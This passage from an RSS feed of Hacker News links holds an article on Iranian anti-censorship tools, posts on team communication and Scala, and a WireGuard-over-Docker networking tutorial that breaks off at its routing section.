<p>Yahyanejad says Toosheh gained nearly 100,000 new Iranians users in November 2019. In the absence of an internet connection, it became the only way for many users to access news from the outside world. The voice on Toosheh‚Äôs voicemail belonged to one such user, a 34-year-old high school principal in Tehran who downloaded emergency VPN and proxy tools delivered to him through the satellite service.&nbsp;</p>



<p>Having navigated extensive cyber censorship for over a decade, Iranians are tech savvy and <a href="https://www.bbc.com/news/blogs-trending-42612546">adept at nimbly crossing firewalls</a>, using proxies and foreign circumvention tools. ‚ÄúIt‚Äôs a constant cat-and-mouse game,‚Äù says Fereidoon Bashar, executive director of ASL19, a Canadian organization working to help Iranians bypass internet censorship. The group often works in tandem with Yahyanejad to distribute proxy tools.&nbsp;</p>



<p>Bashar says Iranians adapt quickly to ever-changing institutionalized control online. But the last five years of Iranian president Hassan Rouhani‚Äôs rule have seen <a href="https://www.cnet.com/news/irans-president-plans-to-cut-countrys-internet-off-from-the-rest-of-the-world/">a tighter grip on internet connections</a>. Site blocking and calculated internet outages have become easier to enforce: the regime has reduced Iran‚Äôs dependence on global networks by pushing a local intranet, with the <a href="https://www.wired.com/2016/09/how-iran-is-building-its-censorship-friendly-domestic-internet/">aim to keep online traffic</a> inside the country. With strict American sanctions that threaten hefty fines for companies interfacing with Iran, foreign tech companies limit ordinary Iranians‚Äô ability to purchase reliable proxies <a href="https://www.wired.com/2016/09/how-iran-is-building-its-censorship-friendly-domestic-internet/">out of an abundance of caution</a>. Riddled with insecurity, the local VPN black market is not a reliable option for those trying to avoid government attention.</p>



<p>But even as internet access grew incrementally difficult over the years, no one saw the November blackout coming. ‚ÄúAn internet shutdown was previously viewed as a kind of dystopian political campaign,‚Äù says Kaveh Azarhoosh, an internet policy researcher. In November, the worst-case scenario for Iran‚Äôs censorship suddenly became a reality.&nbsp;&nbsp;</p>



<p>In the early days of the protest, Toosheh created a special ‚ÄúProtest News Package.‚Äù Every night, after aggregating content from over 200 publications, Toosheh delivered digital bundles containing clips of protests occuring in different cities: Tabriz, Qom, Shiraz, Mashhad, and others. It also contained slides about how to stay safe during a protest; crucial news coverage from banned sites, like the <em>New York Times</em>, Voice of America Persian, and Deutsche Welle; and a curated compilation of tweets from Iranian politicians. These packages weren‚Äôt just bringing news of the outside world to Iran: they kept Iranians informed about what was happening inside their own country too.</p>



<p>Yahyanejad, a physicist by training, left Iran in 1997 to pursue a Ph.D. from the Massachusetts Institute of Technology. ‚ÄúI‚Äôve lived in Iran, and I‚Äôve gone to school and college there,‚Äù he explains. ‚ÄúI know that this repressive government exists because they are able to control the flow of information.‚Äù He says he‚Äôs always had an interest in limiting their control. ‚ÄúI want,‚Äù he says, ‚Äúto see democracy in Iran in my lifetime.‚Äù&nbsp;</p>



<p>In 2006, Yahyanejad launched a Reddit-like forum called <a href="https://www.balatarin.com/">Balatarin</a>. ‚ÄúIts popularity surprised me,‚Äù he says. The site posted a translated rumor about the supreme leader‚Äôs death, after he hadn‚Äôt been seen in public for two months, and was swiftly blocked by Iran shortly after. The moment was a turning point for Yahyanejad, who says, ‚ÄúI made a conscious decision to keep the platform open at a personal cost.‚Äù&nbsp;</p>



<p>The Iranian blocks on Balatarin inspired Yahyanejad to explore censorship circumvention. He launched the satellite app Toosheh in 2016. ‚ÄúI <a href="https://www.youtube.com/watch?v=FWfwF8Gx6VA">went on BBC Persian‚Äôs ‚ÄòNewshour</a>,‚Äô and as soon as I talked about it, people started downloading and testing it immediately,‚Äù he says.&nbsp;</p>



<p>Yahyanjad finds himself among a cohort of diaspora Iranians working to fight the regime‚Äôs censors. ASL19, the Canadian technology group, collaborated with him to deliver proxy tools to over half a million Iranians during November‚Äôs shutdown. ASL19‚Äôs Bashar, who left Iran in the early 2000s before <a href="https://opennet.net/blog/2013/02/after-green-movement-internet-controls-iran-2009-2012">the tumultuous Green Movement</a>, says diaspora Iranians are stepping into the field because Iranians ‚Äúrisk harsh conditions, imprisonment, and long sentences‚Äù if they‚Äôre caught creating circumvention tools inside the country.&nbsp;&nbsp;</p>



<p>But even outside of Iran, outspoken diaspora activists like Bashar and Yahyanejad face immense risks. In June, it was reported that an Iranian activist named Ruhollah Zam was <a href="https://www.bbc.com/news/world-middle-east-53238000">sentenced to death </a>in Iran after creating a popular anti-government Telegram news channel that he operated while living in exile in France. The channel, with 1.4 million followers, was shut down shortly after. For Yahyanejad, who knew of Ruhollah through the diaspora community, the ordeal was a shot across the bow. ‚ÄúI can never go back to Iran,‚Äù Yahyanejad admits. ‚ÄúBut I see myself as part of the movement.‚Äù&nbsp;</p>



<p>Yahyanejad‚Äôs work has become crucial for Iranians, even after November‚Äôs shutdown. On July 14, following news that Iran‚Äôs Supreme Court had upheld the death sentences of three young anti-regime protesters, Iranians took to banned social media sites in an unprecedented protest, with over 6 million posts under the hashtag #DontExecute. Hours after #DontExecute began trending online, digital rights organization NetBlocks <a href="https://twitter.com/netblocks/status/1283106806332620801?s=20">monitored disruptions in the network</a>. Panicked users, still reeling from November‚Äôs shutdown, speculated another block was imminent. Luckily, an all-out ban didn‚Äôt occur, but the renewed threat of one was enough to increase Toosheh‚Äôs usage by more than 50% in the days that followed.&nbsp;</p>



<p>For Yahyanejad, who has been actively fighting the Iranian regime‚Äôs censorship for over a decade, the past year is proof that his work is even more necessary. ‚ÄúInternet shutdowns are psychological tools designed to terrify populations, to convince them that they are voiceless,‚Äù he says. ‚ÄúFighting shutdowns is important so that you can show people that they are not alone and that there are others.‚Äù</p>
		</div></div>]]>
            </description>
            <link>https://restofworld.org/2020/cat-and-mouse-censorship/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24585986</guid>
            <pubDate>Fri, 25 Sep 2020 02:26:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Four communication techniques for solving technical problems]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24585139">thread link</a>) | @sebg
<br/>
September 24, 2020 | https://ansonwhitmer.com/four-communication-techniques-for-solving-technical-problems/ | <a href="https://web.archive.org/web/*/https://ansonwhitmer.com/four-communication-techniques-for-solving-technical-problems/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-67">
	<!-- .entry-header -->

	
	
	<div>
		
<p>All data and engineering teams are faced with a constant inflow of organizational, technical, and interpersonal problems and the ability of your team to have business impact will depend largely on how effectively it can move towards optimal solutions to those problems.&nbsp; In this article, I discuss<em> four communication techniques</em> that improve the ability of a team to solve problems.</p>



<figure><img loading="lazy" src="https://documents.app.lucidchart.com/documents/4a162d92-9c91-4478-91b4-b893591b316f/pages/0_0?a=624&amp;x=109&amp;y=38&amp;w=844&amp;h=253&amp;store=1&amp;accept=image%2F*&amp;auth=LCA%2015c6c000cf3d2ca79ca0f2238c9ccfd56666e1b7-ts%3D1600622689" alt="" width="553" height="164"></figure>



<p><strong><em>Work from the problem to the solution:&nbsp; move in the right direction.</em></strong></p>



<p>When presented with a problem, first spend time elucidating the problem space before addressing potential solutions.&nbsp; Interestingly, I think the intuitive and most common approach is to do the opposite: present and advocate for your solution. &nbsp; I think the reason for this is that people tend to assume that others understand the problem as clearly as you do, that you have a full understanding of the problem, and that you understand which aspects of the problem are the most critical to solve for the business.&nbsp; Thus, the only thing that is interesting is the solution you came up with ‚Äì a solution that is either clever or based on your notable experience.&nbsp;</p>



<p>The problem though is that these assumptions are usually wrong.&nbsp; Typically if you spend time first fleshing out the problem, you will realize that other people on the team have context on the problem that you don‚Äôt have.&nbsp; Or that they do not share an understanding of what the problem is or that there is disagreement about what aspects of the problem are the most critical to solve first.&nbsp; Often you will realize that people are focused on solving the technical problem but that they do not have a good understanding of the <em>business </em>problem.&nbsp; It is critical that the business problem is clearly fleshed out before addressing the technical problem.</p>



<p><em>Recommendation.&nbsp; </em>Spend time talking about the problem before anyone presents solutions.&nbsp; It will make sure everyone has the same context.&nbsp; It ensures that the business problem is the focus and that people will agree ‚Äì <em>before presenting their solution ideas</em> ‚Äì which aspects of the problem are the most critical to solve. This process helps remove ego from the conversation, which can develop when a group of smart highly experienced present different solutions that incidentally emphasize different aspects of the problem.&nbsp; Time spent on the problem space consistently will help you identify better solutions, more efficiently, and with less drama.</p>



<figure><img loading="lazy" src="https://documents.app.lucidchart.com/documents/4a162d92-9c91-4478-91b4-b893591b316f/pages/0_0?a=624&amp;x=121&amp;y=330&amp;w=853&amp;h=272&amp;store=1&amp;accept=image%2F*&amp;auth=LCA%2025c83fef8709e6b41929b2f07e7877b84a6ba280-ts%3D1600622689" alt="" width="576" height="183"></figure>



<p><strong><em>Split-tracking ‚Äì prevent circular and chaotic conversations.&nbsp;</em></strong></p>



<p>I have seen a number of conversations about thorny problems go in circles and not only fail to identify good solutions but even make little progress towards a shared understanding of the problem space.&nbsp; How do you prevent this from happening?&nbsp; The primary thing to do is to keep your conversation organized.&nbsp;&nbsp;</p>



<p>One way to do so is to use a technique called <em>split-tracking</em>.&nbsp; Split-tracking is a technique, in which you identify that more than one issue or concern has been raised, bring group awareness to this observation, generate consensus that there is more than one issue at play, and then push others to focus on one issue at a time. &nbsp; Why does this help? &nbsp; People often don‚Äôt realize that they are conflating two issues so they don‚Äôt realize when they are jumping back and forth between these issues.&nbsp; If these issues are not explicitly identified and separated, it can be hard to probe and press a person‚Äôs thinking on an issue ‚Äì they can unconsciously side-step into the second issue. If there are multiple people discussing a problem, it is possible for people to start going in circles if different people re-direct the group to a secondary issue and then another person brings it back to the first issue.&nbsp;&nbsp;</p>



<p><em>Recommendation.&nbsp; </em>Be on the lookout for multiple underlying issues and concerns.&nbsp; If you see them, stop the conversation and say,  ‚ÄúI am hearing two issues here.&nbsp; One is issue $X and other is issues $Y.&nbsp; Which one should we focus on first?‚Äù &nbsp; Make sure other people realize that there are separate issues ‚Äì even if they are correlated ‚Äì and get them to agree to work on them separately.&nbsp; In general, think like a scientist ‚Äì care about the taxonomy of your problem and neatly classify all the sub-problems that exist and their relation to each other (i.e., this is a subproblem of this bigger problem).&nbsp; You can work towards a solution much more effectively, if the problem space is well organized and explicitly understood by everyone in the conversation.&nbsp;</p>



<p><strong><em>Empathy ‚Äì prevent friction and ‚Äúland mines‚Äù from stopping forward progress.</em></strong></p>



<p>Have you ever been in a meeting discussing a problem, making some progress, and then just suddenly had all forward progress come screeching to a halt? &nbsp; Usually this happens when people become defensive or if the conversation triggered an emotional response in someone.&nbsp; How do we prevent this from happening?&nbsp; Although each individual needs to work to keep the bigger picture in mind and to keep their ego out of the conversation, you cannot control other people‚Äôs reactions.&nbsp; So what can you do?&nbsp;</p>



<p><em>Recommendation.&nbsp; </em>Work on being more empathetic in your communication.&nbsp; Carefully consider how others view the problem and how some aspects of the problem may impact them and their work more than you.&nbsp; Consider that even if they have less relevant experience than you, that they still want their viewpoints to be considered and valued.&nbsp; In general, approach people and their thoughts with curiosity.&nbsp; Try to clarify your understanding of their perspective and make it clear that you are spending time trying to understand their views.</p>



<p>If you do this, you will be less likely to trigger an emotional response that will put a lot of friction between you and your solution.&nbsp; You will make people feel heard even if the solution that is ultimately arrived at doesn‚Äôt solve their main pain points. When you approach problems empathetically, it is also easier to build consensus and excitement in the group, which is critical. Identifying the solution is not the final step ‚Äì implementing the solution is, and you want a motivated team to tackle that step.&nbsp;</p>



<p>Emphasizing empathy when working with others has a few other advantages.&nbsp; One, because empathy is driven by curiosity about someone‚Äôs perspective, it makes it easier to identify genuine issues that you hadn‚Äôt been considering previously, thereby enriching your understanding of the problem.&nbsp; Two, it will help you identify nuances in the concerns of others, providing opportunities for split-tracking and organization of the conversation.&nbsp; Three, empathetic communication enhances psychological safety of the group, which in turn means that all people will feel comfortable voicing their concerns and insights. A group that can communicate openly will be better at fleshing out the full problem space and thereby will be better at identifying the optimal solution.&nbsp;&nbsp;&nbsp;</p>



<p>Lastly, I would like to note although people inherently vary in how empathetic they are, it is also a skill that can be cultivated. &nbsp; So make it a mindset that you work actively to engage in.&nbsp; Cultivate your curiosity. If you struggle with it, try meditation. Its core teaching is the power of developing an open loving curiosity about the world.&nbsp; I‚Äôve spent a week in silent meditation, and I can tell you that if you can find the in and out flow of your breath to be fascinating, then it becomes easy to be intrigued by the perspective of your peers.&nbsp;</p>



<figure><img loading="lazy" src="https://ansonwhitmer.com/wp-content/uploads/2020/09/image-1024x299.png" alt="" width="490" height="142" srcset="https://ansonwhitmer.com/wp-content/uploads/2020/09/image-1024x299.png 1024w, https://ansonwhitmer.com/wp-content/uploads/2020/09/image-300x88.png 300w, https://ansonwhitmer.com/wp-content/uploads/2020/09/image-768x224.png 768w, https://ansonwhitmer.com/wp-content/uploads/2020/09/image.png 1138w" sizes="(max-width: 490px) 85vw, 490px"><figcaption>Monitoring ‚Äì keep the conversation within the lines</figcaption></figure>



<p><strong>Monitoring ‚Äì keep the conversation on track</strong></p>



<p>The part of the brain involved in understanding and solving a problem, the dorsolateral prefrontal cortex, is distinct from the part of the brain, the medial prefrontal cortex, that is involved in monitoring your environment and behavior for errors that signal a course correction is needed.&nbsp; I have noticed that leaders, who are great at moving a team towards optimal solutions, are able to keep this monitoring brain area highly activated even as they also help the team move towards a solution.&nbsp; They tend to be constantly scanning the conversation at a meta-level looking for issues that will derail it.&nbsp; So what type of issues are they monitoring for?&nbsp;</p>



<p><em>Establish what you are monitoring for and set the conditions.&nbsp; </em>To know what to monitor for, you first need to clearly identify, at the start of a meeting, what your agenda is and what the basic problem(s) is that you will address.&nbsp; Once there is consensus here, it will be clearer to you if the conversation has moved off track and what you should be monitoring for.&nbsp; Moreover, it also ensures that you have needed conditions for keeping the conversation on track.&nbsp; For example, given your agenda, you should evaluate whether you even have the right decision makers in the room.&nbsp; Do you have unnecessary people who can push the conversation into tangents or are you lacking the needed people so that even if you make a decision, you may not be able to act upon that decision?&nbsp;&nbsp;&nbsp;</p>



<p><em>Conversation below the right level?&nbsp; </em>Is someone ‚Äúgoing into the weeds‚Äù by diving into a technical explanation that isn‚Äôt needed right now? &nbsp; Monitor for this and pull the group out quickly. &nbsp; At best, it is just a waste of time.&nbsp; At worst, it will derail the conversation.&nbsp;</p>



<p><em>Conversation above the right level?&nbsp; </em>Similarly, thoughts can steer the conversation to a level above the agenda.&nbsp; For example, if your company recently switched to a pods organization and there is some question about how to best handle ownership of one line of work in this new pod structure, it can be easy for the conversation to suddenly be about the pods themselves ‚Äì whether they are good and how to change and improve the pods.&nbsp; This level of conversation would be above the one set in your agenda, is not one that you want to or are capable of addressing in your current meeting, and if you even were interested in addressing it, you probably don‚Äôt have the right people in the room to do so.&nbsp; Pull ‚Ä¶</p></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://ansonwhitmer.com/four-communication-techniques-for-solving-technical-problems/">https://ansonwhitmer.com/four-communication-techniques-for-solving-technical-problems/</a></em></p>]]>
            </description>
            <link>https://ansonwhitmer.com/four-communication-techniques-for-solving-technical-problems/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24585139</guid>
            <pubDate>Fri, 25 Sep 2020 00:10:52 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Scala ‚Äì Just enough rope to hang yourself (2013)]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24583811">thread link</a>) | @todsacerdoti
<br/>
September 24, 2020 | https://quii.dev/Scala_-_Just_enough_rope_to_hang_yourself | <a href="https://web.archive.org/web/*/https://quii.dev/Scala_-_Just_enough_rope_to_hang_yourself">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section id="content"><article id="Scala - Just enough rope to hang yourself"><header><time>02 December 2013</time></header><p>Last week <a href="https://twitter.com/shinyhappydan">Dan</a> and I did a presentation at the <a href="http://joinit.springer.com/">Springer</a> offices for the <a href="https://www.meetup.com/Functional-Media/">Functional Media meetup</a> about our experiences with Scala. We thought it would be interesting to talk about the mistakes we had made with Scala as we thought that would be more interesting than rehashing a number of other talks about why Scala is or isn't good.</p>
<p><a href="https://docs.google.com/presentation/d/1_IcQejhu8byqUMj8MFqVeN3L_EitnVxwG0WUrYV3meE/pub?start=false&amp;loop=false&amp;delayms=3000">You can find the slides here</a></p>
<p>Scala is a very feature rich language and because of this there are many ways of doing things. This was how Scala was designed, to allow developers to express themselves in a flexible way in comparison to languages like Java.</p>
<p>This flexibility is a double-edged sword and I think this not only effects our team but can also effect the OSS community around Scala. Some developers see the power in being able to write DSLs or construct cool type systems which they think will be really useful but aren't actually as generalised and good as they think and can hamstring other developers. As Jeff Atwood says <a href="http://www.codinghorror.com/blog/2013/07/rule-of-three.html">writing re-usable code is hard</a> and that is especially true when with a flexible language like Scala.</p>
<p>This immediately comes to mind when I read this post by <a href="http://overwatering.org/blog/2013/12/scala-1-star-would-not-program-again/">Giles Alexander</a>.</p>
<p>I can actually appreciate some of the author's sentiments. If I started Scala without the aid of working with some very experienced programmers in a pair programming environment I imagine I would find it a nightmare too.</p>
<p>His complaints about def and val to me seem like inexperience in his team with Scala, which then means the resulting code is difficult for everyone. Again, this is Scala's flexibility hurting a team. I actually think good Scala code reads really well, but it takes some discipline and knowhow. Scala can tempt you into writing code you think looks great but is very hard for other people to read.</p>
<h2>Lessons from our talk</h2>
<p>If you want to have a productive team working with Scala, we feel you need</p>
<ul>
<li><em>An enthusiastic team</em> - A team that really wants to learn Scala where individuals demonstrate new powerful ways of getting stuff done to the rest of the team</li>
<li><em>Pair programming</em> - This helps newer people get up to scratch with Scala.</li>
<li><em>Code review</em> - You want to encourage your team to learn how to weild Scala's power but at Springer we make sure we have weekly team code review where we go over code so everyone understands</li>
<li><em>Question things</em> - "The functional way" is not a catch-all argument winner. Leveraging Scala's power is great but readability is the most important factor in code for us.</li>
<li><em>Monitor build times</em> - You cant really avoid Scala's compilation problems. But if you invest a little time with CI to measure it, you can take steps to manage it.</li>
</ul>
<h2>Generalists</h2>
<p>There seems to be a demand on a lot of developers to be "generalists" who know a number of languages and can be productive with them. This is a perfectly valid goal as it means developers generally have a broad and open mind about technical approach.</p>
<p>I'm not entirely sure if Scala is well suited to this as to write <em>good</em> Scala requires you to put effort into learning and appreciating the language. It is a power tool and it means you have to spend time to know how to use it responsibly so you can write concise, readable code.</p>
<p>Some would say this is a bad thing, but after working with Scala for a number of years now and if I was to change language I would want to make sure I picked a language which offers the same power and flexibility of Scala; otherwise I would probably feel like I am fighting the language to get things done.</p>
<p>I totally understand when people accuse Scala being cryptic and bloated, but I think that mainly comes from either using a horrible library of just being inexperienced. I think the true power of Scala is that it gives me the opportunity to express the intent of my code without the need of complicated boilerplate. However, it takes time to get good at it and to be honest that's what I like about it, there's always more to learn.</p>
</article></section></div>]]>
            </description>
            <link>https://quii.dev/Scala_-_Just_enough_rope_to_hang_yourself</link>
            <guid isPermaLink="false">hacker-news-small-sites-24583811</guid>
            <pubDate>Thu, 24 Sep 2020 21:20:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Simple WireGuard Docker network setup]]>
            </title>
            <description>
<![CDATA[
Score 68 | Comments 11 (<a href="https://news.ycombinator.com/item?id=24583512">thread link</a>) | @bjoko
<br/>
September 24, 2020 | https://www.eisfunke.com/article/docker-wireguard-systemd.html | <a href="https://web.archive.org/web/*/https://www.eisfunke.com/article/docker-wireguard-systemd.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>
                        A simple solution for routing specific docker containers through a WireGuard VPN using only two simple systemd-networkd files, no cumbersome <code>wg</code> or <code>ip</code> calls.
                    </p><div id="article">
                <!-- Body -->
<figure>
<img src="https://www.eisfunke.com/res/article/metro-tunnel.jpg" alt=""><figcaption>I heard that dramatic article images heavy with meaning are a meme, so here you have a picture of a subway tunnel because VPNs are network tunnels. <a href="#fn1" id="fnref1" role="doc-noteref"><sup>1</sup></a></figcaption>
</figure>
<p><a href="#instructions-in-short">Jump to short instructions</a></p>
<p>I recently reorganized my self-hosted stuff to use Docker. While Docker not really fits my philosophy, the broad availability and low-maintenance of images for pretty much all software convinced me to switch and so far I‚Äôm happy, it‚Äôs significantly less work than before, I can check the Docker Compose files into version control, and backups are easy with everthing inside Docker volumes.</p>

<p>Anyway ‚Äì here is the scenario I want to talk about: You have one or more Docker containers and you want to route all its traffic through a WireGuard VPN, but not the other containers‚Äô or the host‚Äôs traffic. You have root access to the host machine.</p>

<h2 id="wg-quick">wg-quick</h2>
<p>The most straightforward way of using WireGuard is <a href="https://git.zx2c4.com/wireguard-tools/about/src/man/wg-quick.8"><em>wg-quick</em></a>. You just need a configuration file, about 10 lines long (take a look at an OpenVPN config file and you will appreciate this shortness), run <code>sudo wg-quick up {config file}</code> and your VPN is up and running. These files also work with the Android/iOS/MacOS/Windows apps.</p>
<p>For example, the VPN provider <a href="https://mullvad.net/">Mullvad</a>, which I can recommend 100%, lets you download wg-quick files for easy setup.</p>
<p>wg-quick is easy, but it routes <em>all</em> traffic through the VPN, which is what you want <em>most of the times</em>, but not in our use case. Watch out, the allowed IP range does not help as you might think: You can tell WireGuard that only traffic <em>to</em> specific IPs should be routed through the VPN, which makes sense for something like a VPN for employees: only traffic to the company‚Äôs network should go through the VPN. We however need to filter by <em>source</em>. wg-quick can‚Äôt do that.</p>

<p>After quite a lot of searching I finally found a great <a href="https://nbsoftsolutions.com/blog/routing-select-docker-containers-through-wireguard-vpn#solution-2">blog article</a> detailing a solution to our exact problem using the <code>wg</code> and <code>ip</code> tools directly (and one using WireGuard client inside another container). This article is mostly based on that one.</p>
<p>The gist of that that method is: You set up a WireGuard interface manually, the same way wg-quick does internally, but without any routing to it yet. Then you add a routing rule via <code>ip</code> that sends all traffic from a specific subnet to the VPN. Lastly, you configure the desired Docker container to use exactly that subnet using Docker Compose or <code>docker network</code>.</p>
<p>While it is a nice and elegant solution, I think it is kind of cumbersome to configure, so I tried to find a more comfortable way of setting this up.</p>
<h2 id="systemd-networkd">systemd-networkd</h2>
<p>While I agree with some of the criticism against systemd and its policies, systemd-networkd really is the best thing that ever happened to network configuration on Linux. Instead of fiddling around with awfully complex tools like <code>ip</code> or weird network managers, you can set up your network with short, few and well-documented plain-text config files. I love it. Turns out it also has everything we need for tunneling our Docker containers, and in a nice and easy way. This is the solution I went with and want to show you.</p>

<p>For the impatient. For detailed instructions see below.</p>
<p>To tunnel a container through a WireGuard VPN given a wg-quick config file from your VPN provider, add these files to <code>/etc/systemd/network/</code>:</p>
<p><strong><code>80-wg0.netdev</code>:</strong></p>
<div id="cb1"><pre><code><span id="cb1-1"><span>[NetDev]</span></span>
<span id="cb1-2"><span>Name </span><span>=</span><span> wg0</span></span>
<span id="cb1-3"><span>Kind </span><span>=</span><span> wireguard</span></span>
<span id="cb1-4"><span>Description </span><span>=</span><span> WireGuard VPN</span></span>
<span id="cb1-5"></span>
<span id="cb1-6"><span>[WireGuard]</span></span>
<span id="cb1-7"><span>PrivateKey </span><span>=</span><span> {Private key, same as in wg-quick config}</span></span>
<span id="cb1-8"></span>
<span id="cb1-9"><span>[WireGuardPeer]</span></span>
<span id="cb1-10"><span>PublicKey </span><span>=</span><span> {Public key, same as in wg-quick config}</span></span>
<span id="cb1-11"><span>AllowedIPs </span><span>=</span><span> </span><span>0</span><span>.</span><span>0</span><span>.</span><span>0.0</span><span>/</span><span>0</span><span>,::</span><span>0</span><span>/</span><span>0</span></span>
<span id="cb1-12"><span>Endpoint</span><span>=</span><span> {Endpoint, same as in wg-quick config}</span></span></code></pre></div>
<p><strong><code>85-wg0.network</code>:</strong></p>
<div id="cb2"><pre><code><span id="cb2-1"><span>[Match]</span></span>
<span id="cb2-2"><span>Name</span><span>=</span><span>wg0</span></span>
<span id="cb2-3"></span>
<span id="cb2-4"><span>[Network]</span></span>
<span id="cb2-5"><span># If you need multiple addresses, e.g. for IPv4 and 6, use multiple Address lines.</span></span>
<span id="cb2-6"><span>Address </span><span>=</span><span> {Address to bind to inside the VPN, same as in wg-quick config}</span></span>
<span id="cb2-7"></span>
<span id="cb2-8"><span>[RoutingPolicyRule]</span></span>
<span id="cb2-9"><span>From </span><span>=</span><span> </span><span>10</span><span>.</span><span>123</span><span>.</span><span>0.0</span><span>/</span><span>16</span></span>
<span id="cb2-10"><span>Table </span><span>=</span><span> </span><span>242</span></span>
<span id="cb2-11"></span>
<span id="cb2-12"><span>[Route]</span></span>
<span id="cb2-13"><span>Gateway </span><span>=</span><span> {The address of the interface, same as above in [Network] in Address}</span></span>
<span id="cb2-14"><span>Table </span><span>=</span><span> </span><span>242</span></span>
<span id="cb2-15"></span>
<span id="cb2-16"><span>[Route]</span></span>
<span id="cb2-17"><span>Destination </span><span>=</span><span> </span><span>0</span><span>.</span><span>0</span><span>.</span><span>0.0</span><span>/</span><span>0</span></span>
<span id="cb2-18"><span>Type </span><span>=</span><span> blackhole</span></span>
<span id="cb2-19"><span>Metric </span><span>=</span><span> </span><span>1</span></span>
<span id="cb2-20"><span>Table </span><span>=</span><span> </span><span>242</span></span></code></pre></div>
<p>Then run <code>sudo docker network create tunneled0 --subnet 10.123.0.0</code>. Now you can run docker containers with <code>--net=tunneled0</code> to tunnel them.</p>
<p>Alternatively use Docker Compose to create and use a Docker network in that subnet:</p>
<div id="cb3"><pre><code><span id="cb3-1"><span>version</span><span>:</span><span> </span><span>"3.7"</span></span>
<span id="cb3-2"><span>services</span><span>:</span></span>
<span id="cb3-3"><span>  </span><span>app</span><span>:</span></span>
<span id="cb3-4"><span>    </span><span>image</span><span>:</span><span> </span><span>{</span><span>image</span><span>}</span></span>
<span id="cb3-5"><span>    </span><span>dns</span><span>:</span><span> </span><span>"{DNS server to use}"</span></span>
<span id="cb3-6"><span>    </span><span>networks</span><span>:</span></span>
<span id="cb3-7"><span>      </span><span>tunneled0</span><span>:</span><span> </span><span>{}</span></span>
<span id="cb3-8"><span>networks</span><span>:</span></span>
<span id="cb3-9"><span>  </span><span>tunneled0</span><span>:</span></span>
<span id="cb3-10"><span>    </span><span>ipam</span><span>:</span></span>
<span id="cb3-11"><span>      </span><span>config</span><span>:</span></span>
<span id="cb3-12"><span>        </span><span>-</span><span> </span><span>subnet</span><span>:</span><span> 10.123.0.0/16</span></span></code></pre></div>
<p>That‚Äôs it!</p>

<h2 id="preparation">Preparation</h2>
<p>Make sure that your host has:</p>
<ul>
<li>systemd. Most Linuxes do.</li>
<li>The WireGuard kernel module installed or kernel 5.6 or newer running.</li>
<li>The WireGuard tools installed.</li>
<li>Docker and optionally Docker Compose installed.</li>
<li>A working network connection. I don‚Äôt think it needs to be configured using systemd-networkd, though I haven‚Äôt tested that. I recommend to use networkd if possible anyway.</li>
<li>systemd-networkd running and enabled (<code>sudo systemctl enable systemd-networkd &amp;&amp; systemctl start system-networkd</code>).</li>
</ul>
<h2 id="setting-up-the-interface">Setting up the Interface</h2>
<p>First we have to get the WireGuard interface running. We couldn‚Äôt do it with <code>wg-quick</code> as it automatically routes all traffic through it, and using <code>wg</code> is cumbersome, so we use systemd-networkd. All we have to do is add two files in <code>/etc/systemd/network/</code>:</p>
<p><strong><code>80-wg0.netdev</code>:</strong></p>
<div id="cb4"><pre><code><span id="cb4-1"><span>[NetDev]</span></span>
<span id="cb4-2"><span># Or any other name</span></span>
<span id="cb4-3"><span>Name </span><span>=</span><span> wg0</span></span>
<span id="cb4-4"><span>Kind </span><span>=</span><span> wireguard</span></span>
<span id="cb4-5"><span># Or your own description</span></span>
<span id="cb4-6"><span>Description </span><span>=</span><span> WireGuard VPN</span></span>
<span id="cb4-7"></span>
<span id="cb4-8"><span>[WireGuard]</span></span>
<span id="cb4-9"><span>PrivateKey </span><span>=</span><span> {Private key, same as in wg-quick config}</span></span>
<span id="cb4-10"></span>
<span id="cb4-11"><span>[WireGuardPeer]</span></span>
<span id="cb4-12"><span>PublicKey </span><span>=</span><span> {Public key, same as in wg-quick config}</span></span>
<span id="cb4-13"><span># Remeber, these are allowed target IPs, not source, therefore we allow all</span></span>
<span id="cb4-14"><span>AllowedIPs </span><span>=</span><span> </span><span>0</span><span>.</span><span>0</span><span>.</span><span>0.0</span><span>/</span><span>0</span><span>,::</span><span>0</span><span>/</span><span>0</span></span>
<span id="cb4-15"><span>Endpoint</span><span>=</span><span> {Endpoint, same as in wg-quick config}</span></span></code></pre></div>
<p><strong><code>85-wg0.network</code>:</strong></p>
<div id="cb5"><pre><code><span id="cb5-1"><span>[Match]</span></span>
<span id="cb5-2"><span># Same as in .netdev file</span></span>
<span id="cb5-3"><span>Name</span><span>=</span><span>wg0</span></span>
<span id="cb5-4"></span>
<span id="cb5-5"><span>[Network]</span></span>
<span id="cb5-6"><span># If you need multiple addresses, e.g. for IPv4 and 6, use multiple Address lines.</span></span>
<span id="cb5-7"><span>Address </span><span>=</span><span> {Address to bind to inside the VPN, same as in wg-quick config}</span></span></code></pre></div>
<p>As you can see, it‚Äôs very similar to and just as easy as a wg-quick config file and most values can be taken straight from said file. For more info take a look at the man pages of <a href="https://www.freedesktop.org/software/systemd/man/systemd.netdev.html">netdev</a> and <a href="https://www.freedesktop.org/software/systemd/man/systemd.network.html">network</a> files.</p>
<p>The names of the files can be adjusted to your liking. Note that systemd-networkd reads config files in alphabetic order, so adjust the prefixed numbers in the names if necessary.</p>
<p>Use <code># systemctl restart systemd-networkd</code> (or reboot to be sure) to apply the configs. Now you can verify that the inferface is actually working:</p>
<pre><code>$ curl -4 icanhazip.com
$ sudo curl -4 --interface wg0 icanhazip.com</code></pre>
<p>The results of the two <code>curl</code> calls should be different, the first shows your normal IP, the second one should yield the VPN IP address. Note that for me the second curl only works as root (probably curl can only bind to the interface as root for some reason). With <code>sudo wg</code> and <code>networkctl status wg0</code> you can get further info about the interface.</p>
<h2 id="routing">Routing</h2>
